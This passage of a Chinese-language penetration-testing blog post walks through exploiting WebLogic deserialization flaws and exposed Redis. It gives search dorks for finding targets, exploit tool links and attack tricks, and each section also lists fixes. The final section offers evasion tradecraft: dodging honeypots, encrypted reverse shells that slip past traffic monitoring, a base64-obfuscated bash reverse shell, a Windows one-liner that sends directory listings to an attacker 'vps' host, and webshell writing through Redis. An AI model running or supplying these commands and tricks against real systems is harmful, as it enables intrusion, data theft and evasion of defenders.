&lt;p&gt;Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Weblogic&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Lcom.tangosol.util.extractor.ReflectionExtractor&lt;/p&gt;
&lt;p&gt;…&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;protocol==&amp;quot;weblogic&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;相关漏洞有:&lt;/p&gt;
&lt;p&gt;CVE-2017-3248
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/333/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/333/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVE-2018-2628
&lt;a class=&#34;link&#34; href=&#34;http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVE-2018-2893
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/178105.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/178105.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVE-2019-2890
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/1069/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/1069/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVE-2020-2555(Oracle Coherence)
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/1141/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/1141/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.
&lt;a class=&#34;link&#34; href=&#34;https://www.oracle.com/security-alerts/cpuapr2020.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.oracle.com/security-alerts/cpuapr2020.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;weblogic 漏洞扫描工具
&lt;a class=&#34;link&#34; href=&#34;https://github.com/0xn0ne/weblogicScanner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/0xn0ne/weblogicScanner&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVE-2020-2555
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Y4er/CVE-2020-2555&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Y4er/CVE-2020-2555&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -sV --script=weblogic-t3-info.nse -p 7001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用&lt;/p&gt;
&lt;p&gt;Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Bort-Millipede/WLT3Serial&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Bort-Millipede/WLT3Serial&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁
2.禁用T3协议
3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源&lt;/p&gt;
&lt;h2 id=&#34;weblogic-xmldecoder反序列化&#34;&gt;Weblogic XMLDecoder反序列化&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.&lt;/p&gt;
&lt;p&gt;2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;WebLogic 10.X&lt;/p&gt;
&lt;p&gt;WebLogic 12.1.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/wls-wsat/CoordinatorPortType&lt;/code&gt;
&lt;code&gt;/_async/AsyncResponseService&lt;/code&gt;
&lt;code&gt;/_async/AsyncResponseServiceSoap12&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;WebLogic-Server&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（CVE-2017-3506 &amp;amp;CVE-2017-10271）
&lt;a class=&#34;link&#34; href=&#34;http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVE-2019-2725
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/909/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/909/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;
weblogicScanner
&lt;a class=&#34;link&#34; href=&#34;https://github.com/0xn0ne/weblogicScanner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/0xn0ne/weblogicScanner&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.由于nginx转发问题, 尝试这种路径, 可能有惊喜&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/../wls-wsat/CoordinatorPortType11&lt;/code&gt;
&lt;code&gt;/../_async/AsyncResponseService&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.Weblogic 写shell有个技巧&lt;/p&gt;
&lt;p&gt;可以通过&lt;code&gt;find&lt;/code&gt;/&lt;code&gt;grep&lt;/code&gt;命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的&lt;code&gt;logo.png&lt;/code&gt; / &lt;code&gt;/static/css/main.css&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；&lt;/p&gt;
&lt;p&gt;2.删除对应war包并重启 webLogic；&lt;/p&gt;
&lt;p&gt;3.限制源IP对应 weblogic 7001端口的访问.&lt;/p&gt;
&lt;h2 id=&#34;weblogic-iiop&#34;&gt;Weblogic IIOP&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Oracle WebLogic Server version:&lt;/p&gt;
&lt;p&gt;10.3.6.0.0&lt;/p&gt;
&lt;p&gt;12.1.3.0.0&lt;/p&gt;
&lt;p&gt;12.2.1.3.0 and 12.2.1.4.0&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GIOP &amp;amp;&amp;amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;WebLogic-Server&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;WebLogic CVE-2020-2551漏洞分析
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/1138/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/1138/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Y4er/CVE-2020-2551&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Y4er/CVE-2020-2551&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/201005&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/201005&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.通过 Weblogic 控制台进行关闭 IIOP 协议&lt;/p&gt;
&lt;h2 id=&#34;redis-相关漏洞&#34;&gt;Redis 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Redis&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;6379&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Redis&amp;quot; &amp;amp;&amp;amp; &amp;quot;redis_version&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Redis 基于主从复制的 RCE 利用方式
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/975/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/975/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!
&lt;a class=&#34;link&#34; href=&#34;https://github.com/n0b0dyCN/RedisModules-ExecuteCommand&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/n0b0dyCN/RedisModules-ExecuteCommand&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.当Redis 权限满足写文件时&lt;/p&gt;
&lt;p&gt;linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell&lt;/p&gt;
&lt;p&gt;2.当Redis 权限不满足写文件时&lt;/p&gt;
&lt;p&gt;发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞&lt;/p&gt;
&lt;p&gt;发现Redis记录中存在&lt;code&gt;AC ED&lt;/code&gt;这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Redis 设置强口令&lt;/p&gt;
&lt;p&gt;2.Redis 尽量不要开放到公网&lt;/p&gt;
&lt;p&gt;3.限制来源IP&lt;/p&gt;
&lt;h2 id=&#34;后记&#34;&gt;后记&lt;/h2&gt;
&lt;p&gt;1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台&lt;/p&gt;
&lt;p&gt;搜索结果 – FOFA网络空间测绘系统
&lt;a class=&#34;link&#34; href=&#34;https://fofa.so/result?q=%22var&amp;#43;jtoken%3D%27%22&amp;amp;qbase64=InZhciBqdG9rZW49JyI%3D&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://fofa.so/result?q=%22var+jtoken%3D%27%22&amp;qbase64=InZhciBqdG9rZW49JyI%3D&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到&lt;/p&gt;
&lt;p&gt;Reverse shell cheatsheet 多种反弹shell的命令
&lt;a class=&#34;link&#34; href=&#34;https://krober.biz/misc/reverse_shell.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://krober.biz/misc/reverse_shell.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/1337 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;base64 可以转换成&lt;/p&gt;
&lt;p&gt;&lt;code&gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最终可以变成&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -c &amp;quot;{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}|{base64, -d}|{bash, -i}&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for /f %s in (&#39;dir c:\ /b&#39;) do explorer http://vps:8000/?%s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\\vps\share\shell.bat&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况&lt;/p&gt;
&lt;p&gt;这里主要是没有指定&lt;code&gt;hostname&lt;/code&gt;, 这里可以使用&lt;code&gt;socat&lt;/code&gt;进行流量转发, 无需修改POC, 以&lt;code&gt;CVE-2019-12409&lt;/code&gt;为例&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现
这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址
通过查看报错, 可以得知内网地址, 例如 172.18.0.2
使用如下两条命令即可执行, 替换 &lt;code&gt;[报错中的ip]&lt;/code&gt;, &lt;code&gt;[远程目标的ip]&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip addr add [报错中的ip]/24 dev lo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socat tcp4-listen:18983, bind=[报错中的ip], reuseaddr, fork tcp4-connect:[远程目标的ip]:18983
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接&lt;/p&gt;
&lt;p&gt;深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台
&lt;a class=&#34;link&#34; href=&#34;https://www.vulbox.com/knowledge/detail/?id=11&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.vulbox.com/knowledge/detail/?id=11&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;tomcat不出网回显连续剧第六集 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7535&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7535&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Weblogic T3/iiop 构造有回显exp方案分析 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7489&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7489&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;weblogic IIOP漏洞的回显构造研究 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7393&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7393&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;linux下java反序列化通杀回显方法的低配版实现 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7307&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7307&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/232544.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/232544.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如何绕过高版本JDK限制进行JNDI注入利用
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JosephTribbianni/JNDI: JNDI 注入利用工具
&lt;a class=&#34;link&#34; href=&#34;https://github.com/JosephTribbianni/JNDI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/JosephTribbianni/JNDI&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题
最后祝大家 &lt;strong&gt;开局有0day, 处处弱口令&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
